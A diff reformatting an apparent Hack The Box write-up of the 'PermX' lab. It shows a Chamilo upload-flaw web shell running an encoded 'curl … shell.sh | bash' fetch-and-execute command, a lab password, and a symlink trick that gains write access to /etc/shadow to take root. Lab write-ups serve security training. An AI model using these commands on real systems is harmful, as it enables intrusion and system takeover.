@@ -1,1 +1,153 @@
-<html><head><meta charset="utf-8"></head><body><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Shell as www-data</u></strong></span></p><p>&nbsp;</p><p>Sub domains found</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1212/517;" src="../img/posts/2024-08-01-PermX(HTB)/01-13431b8b59.png" width="1212" height="517"></figure><p>&nbsp;</p><p>&nbsp;</p><p>www is a cloned website of the main site</p><p>&nbsp;</p><p>lms has a login page</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1429/604;" src="../img/posts/2024-08-01-PermX(HTB)/02-b46df82768.png" width="1429" height="604"></figure><p>&nbsp;</p><p>Looking at exploits for this we have rce</p><p>https://starlabs.sg/advisories/23/23-4220/</p><figure class="image"><img style="aspect-ratio:1166/304;" src="../img/posts/2024-08-01-PermX(HTB)/03-6be6548b18.png" width="1166" height="304"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>Getting a shell</p><p>&nbsp;</p><p><code>curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/shell.php?cmd=%63%75%72%6c%20%68%74%74%70%3a%2f%2f%31%30%2e%31%30%2e%31%34%2e%34%3a%38%30%30%30%2f%73%68%65%6c%6c%2e%73%68%20%20%7c%20%62%61%73%68'</code></p><figure class="image"><img style="aspect-ratio:1278/93;" src="../img/posts/2024-08-01-PermX(HTB)/04-e8f153280b.png" width="1278" height="93"></figure><p>&nbsp;</p><p>And our listener</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:657/68;" src="../img/posts/2024-08-01-PermX(HTB)/05-01f0554daa.png" width="657" height="68"></figure><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Shell as mtz</u></strong></span></p><p>&nbsp;</p><p>We cannot access the user directory so we need to move laterally and compromise their account</p><p>&nbsp;</p><p>After a ton of manual enumeration i found the password</p><p>03F6lY3uXAP2bkW8</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:787/71;" src="../img/posts/2024-08-01-PermX(HTB)/06-f21e12c47b.png" width="787" height="71"></figure><p>&nbsp;</p><p>We can now get the user flag</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:731/170;" src="../img/posts/2024-08-01-PermX(HTB)/07-1601785d11.png" width="731" height="170"></figure><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Privilege Escalation to root</u></strong></span></p><p>&nbsp;</p><p>We can run this script as root</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:806/200;" src="../img/posts/2024-08-01-PermX(HTB)/08-6d5fef719f.png" width="806" height="200"></figure><p>&nbsp;</p><p>mtz@permx:/var/www/chamilo$ cat /opt/acl.sh&nbsp;<br><code>#!/bin/bash</code></p><p><code>if [ "$#" -ne 3 ]; then</code><br><code>&nbsp; &nbsp;/usr/bin/echo "Usage: $0 user perm file"</code><br><code>&nbsp; &nbsp;exit 1</code><br><code>fi</code></p><p><code>user="$1"</code><br><code>perm="$2"</code><br><code>target="$3"</code></p><p><code>if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then</code><br><code>&nbsp; &nbsp;/usr/bin/echo "Access denied."</code><br><code>&nbsp; &nbsp;exit 1</code><br><code>fi</code></p><p><code># Check if the path is a file</code><br><code>if [ ! -f "$target" ]; then</code><br><code>&nbsp; &nbsp;/usr/bin/echo "Target must be a file."</code><br><code>&nbsp; &nbsp;exit 1</code><br><code>fi</code></p><p><code>/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"</code></p><p>&nbsp;</p><p>After a bit of testing I thought about using a symbolic link. Typically when creating a link you wont have access to read it BUT with this script we can change any permissions to any file within the /home/mtz file. So theoretically we should be able to create a link to any file and give ourselves read and write permissions to the link therefore editing the main file too.</p><p>&nbsp;</p><p>Create a link to /etc/shadow</p><p><code>ln -s /etc/shadow /home/mtz/link_to_shadow</code><br>&nbsp;</p><p>Change permissions of the link so we have RW access</p><p><code>sudo /opt/acl.sh mtz rw /home/mtz/link_to_shadow</code></p><p>&nbsp;</p><p>And sure enough it works</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:863/572;" src="../img/posts/2024-08-01-PermX(HTB)/09-bc62f40fee.png" width="863" height="572"></figure><p>&nbsp;</p><p>We then nano the linked shadow file, and since its a link it will edit the main shadow file. We can now copy the password from our user mtz since we know what the unshadowed version is and replace it with the root shadow password(essentially changing the password).</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:795/140;" src="../img/posts/2024-08-01-PermX(HTB)/10-eb6bd0cfb5.png" width="795" height="140"></figure><p>&nbsp;</p><p>By changing the mtz shadow hash to the root hash we essentially change the root password to mtz's password which is 03F6lY3uXAP2bkW8</p><p>&nbsp;</p><p>&nbsp;</p><p>Switching to root with the new changed password</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:397/121;" src="../img/posts/2024-08-01-PermX(HTB)/11-db10ceef7f.png" width="397" height="121"></figure><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:700/633;" src="../img/posts/2024-08-01-PermX(HTB)/12-1def8c2360.png" width="700" height="633"></figure></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>HTB: PermX | HackWithJordan</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="../assets/css/syntax.css">
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+
+        .post {
+            width: 100%;
+            max-width: 900px;
+        }
+
+        .terminal {
+            background: #98AFC7;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            max-width: 100%;
+            white-space: pre-wrap;
+            word-break: break-word;
+            font-family: monospace;
+            margin: 15px 0;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            margin: 15px 0;
+            display: block;
+        }
+
+        p {
+            margin: 15px 0;
+            line-height: 1.5;
+            overflow-wrap: anywhere;
+        }
+
+        code {
+            overflow-wrap: anywhere;
+        }
+    </style>
+</head>
+<body>
+
+    <article class="post">
+        <header style="display: flex; align-items: center; gap: 20px;">
+            <img src="../img/posts/2024-08-01-PermX(HTB)/01-13431b8b59.png" alt="HTB: PermX cover" style="height: 80px; border-radius: 4px;">
+            <div>
+                <h1 style="margin: 0;">HTB: PermX</h1>
+                <div class="post-meta">August 1, 2024 &bull; HTB</div>
+            </div>
+        </header>
+
+        <h1 style="color:red;">Shell as www-data</h1>
+
+        <p>Sub domains found</p>
+
+        <img alt="Screenshot 1" height="517" src="../img/posts/2024-08-01-PermX(HTB)/01-13431b8b59.png" style="aspect-ratio:1212/517;" width="1212"/>
+
+        <p>www is a cloned website of the main site</p>
+
+        <p>lms has a login page</p>
+
+        <img alt="Screenshot 2" height="604" src="../img/posts/2024-08-01-PermX(HTB)/02-b46df82768.png" style="aspect-ratio:1429/604;" width="1429"/>
+
+        <p>Looking at exploits for this we have rce</p>
+
+        <p>https://starlabs.sg/advisories/23/23-4220/</p>
+
+        <img alt="Screenshot 3" height="304" src="../img/posts/2024-08-01-PermX(HTB)/03-6be6548b18.png" style="aspect-ratio:1166/304;" width="1166"/>
+
+        <p>Getting a shell</p>
+
+        <pre class="terminal"><code>curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/shell.php?cmd=%63%75%72%6c%20%68%74%74%70%3a%2f%2f%31%30%2e%31%30%2e%31%34%2e%34%3a%38%30%30%30%2f%73%68%65%6c%6c%2e%73%68%20%20%7c%20%62%61%73%68'</code></pre>
+
+        <img alt="Screenshot 4" height="93" src="../img/posts/2024-08-01-PermX(HTB)/04-e8f153280b.png" style="aspect-ratio:1278/93;" width="1278"/>
+
+        <p>And our listener</p>
+
+        <img alt="Screenshot 5" height="68" src="../img/posts/2024-08-01-PermX(HTB)/05-01f0554daa.png" style="aspect-ratio:657/68;" width="657"/>
+
+        <h1 style="color:red;">Shell as mtz</h1>
+
+        <p>We cannot access the user directory so we need to move laterally and compromise their account</p>
+
+        <p>After a ton of manual enumeration i found the password</p>
+
+        <p>03F6lY3uXAP2bkW8</p>
+
+        <img alt="Screenshot 6" height="71" src="../img/posts/2024-08-01-PermX(HTB)/06-f21e12c47b.png" style="aspect-ratio:787/71;" width="787"/>
+
+        <p>We can now get the user flag</p>
+
+        <img alt="Screenshot 7" height="170" src="../img/posts/2024-08-01-PermX(HTB)/07-1601785d11.png" style="aspect-ratio:731/170;" width="731"/>
+
+        <h1 style="color:red;">Privilege Escalation to root</h1>
+
+        <p>We can run this script as root</p>
+
+        <img alt="Screenshot 8" height="200" src="../img/posts/2024-08-01-PermX(HTB)/08-6d5fef719f.png" style="aspect-ratio:806/200;" width="806"/>
+
+        <p>mtz@permx:/var/www/chamilo$ cat /opt/acl.sh <br/><code>#!/bin/bash</code></p>
+
+        <p><code>if [ "$#" -ne 3 ]; then</code><br/><code>   /usr/bin/echo "Usage: $0 user perm file"</code><br/><code>   exit 1</code><br/><code>fi</code></p>
+
+        <p><code>user="$1"</code><br/><code>perm="$2"</code><br/><code>target="$3"</code></p>
+
+        <p><code>if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then</code><br/><code>   /usr/bin/echo "Access denied."</code><br/><code>   exit 1</code><br/><code>fi</code></p>
+
+        <p><code># Check if the path is a file</code><br/><code>if [ ! -f "$target" ]; then</code><br/><code>   /usr/bin/echo "Target must be a file."</code><br/><code>   exit 1</code><br/><code>fi</code></p>
+
+        <pre class="terminal"><code>/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"</code></pre>
+
+        <p>After a bit of testing I thought about using a symbolic link. Typically when creating a link you wont have access to read it BUT with this script we can change any permissions to any file within the /home/mtz file. So theoretically we should be able to create a link to any file and give ourselves read and write permissions to the link therefore editing the main file too.</p>
+
+        <p>Create a link to /etc/shadow</p>
+
+        <pre class="terminal"><code>ln -s /etc/shadow /home/mtz/link_to_shadow</code></pre>
+
+        <p>Change permissions of the link so we have RW access</p>
+
+        <pre class="terminal"><code>sudo /opt/acl.sh mtz rw /home/mtz/link_to_shadow</code></pre>
+
+        <p>And sure enough it works</p>
+
+        <img alt="Screenshot 9" height="572" src="../img/posts/2024-08-01-PermX(HTB)/09-bc62f40fee.png" style="aspect-ratio:863/572;" width="863"/>
+
+        <p>We then nano the linked shadow file, and since its a link it will edit the main shadow file. We can now copy the password from our user mtz since we know what the unshadowed version is and replace it with the root shadow password(essentially changing the password).</p>
+
+        <img alt="Screenshot 10" height="140" src="../img/posts/2024-08-01-PermX(HTB)/10-eb6bd0cfb5.png" style="aspect-ratio:795/140;" width="795"/>
+
+        <p>By changing the mtz shadow hash to the root hash we essentially change the root password to mtz's password which is 03F6lY3uXAP2bkW8</p>
+
+        <p>Switching to root with the new changed password</p>
+
+        <img alt="Screenshot 11" height="121" src="../img/posts/2024-08-01-PermX(HTB)/11-db10ceef7f.png" style="aspect-ratio:397/121;" width="397"/>
+
+        <img alt="Screenshot 12" height="633" src="../img/posts/2024-08-01-PermX(HTB)/12-1def8c2360.png" style="aspect-ratio:700/633;" width="700"/>
+    </article>
+
+</body>
+</html>
